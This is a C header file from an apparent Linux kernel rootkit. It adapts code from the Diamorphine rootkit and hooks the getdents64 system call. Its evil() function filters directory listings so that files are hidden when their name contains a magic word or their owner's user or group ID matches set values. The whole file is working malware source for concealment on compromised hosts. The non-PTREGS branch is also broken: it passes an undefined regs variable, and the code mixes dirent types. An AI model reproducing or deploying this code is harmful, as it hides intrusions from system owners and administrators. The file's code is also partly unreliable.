/**
The evil() method contains code for linux_direnet element removal from https://github.com/m0nad/Diamorphine,
see https://github.com/m0nad/Diamorphine/blob/master/LICENSE.txt for further details about license.
 */

#pragma once

#include "rootkit.h"
#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>


extern char* MAGIC_WORD;

/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};
*/


int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {	
	int err;
	unsigned long off = 0;
	struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
	int user;
	int group;
	struct linux_dirent64 *dir, *kdir, *kdirent, *prev = NULL;

	kdirent = kzalloc(res, GFP_KERNEL);
	if (kdirent == NULL){
		//printk(KERN_DEBUG "kzalloc failed\n");
		return res;
	}

	err = copy_from_user(kdirent, dirent, res);
	if (err){
		//printk(KERN_DEBUG "can not copy from user!\n");
		goto out;
	}

	int (*vfs_fstatat_ptr)(int, const char __user *, struct kstat *, int) = (int (*)(int, const char __user *, struct kstat *, int))lookup_name("vfs_fstatat");

	//printk(KERN_DEBUG "vfs_fstatat_ptr is at %lx\n", vfs_fstatat_ptr);

	while (off < res) {
		kdir = (void *)kdirent + off;
		dir = (void *)dirent + off;
		err = vfs_fstatat_ptr(fd, dir->d_name, stat, 0);
		if (err){
			//printk(KERN_DEBUG "can not read file attributes!\n");
			goto out;
		}
		user = (int)stat->uid.val;
		group = (int)stat->gid.val;
		if (strstr(kdir->d_name, MAGIC_WORD)
			|| user == USER_HIDE
			|| group == GROUP_HIDE) {
			if (kdir == kdirent) {
				res -= kdir->d_reclen;
				memmove(kdir, (void *)kdir + kdir->d_reclen, res);
				continue;
			}
			prev->d_reclen += kdir->d_reclen;
		} else {
			prev = kdir;
		}
		off += kdir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, res);
	if (err){
		//printk(KERN_DEBUG "can not copy back to user!\n");
		goto out;
	}
	out:
		kfree(stat);
		kfree(kdirent);
	return res;
}
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);

static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
	struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
	unsigned int fd = FIRST_ARG(regs, unsigned int);
	int res;
	
	res = orig_sys_getdents64(regs);


	if (res <= 0){
		// The original getdents failed - we aint mangling with that.
		return res;
	}

	res = evil(dirent, res, fd);
	
	return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
	int res;
	
	res = orig_sys_getdents64(regs);


	if (res <= 0){
		// The original getdents failed - we aint mangling with that.
		return res;
	}

	res = evil(dirent, res, fd);
	
	return res;
}
#endif
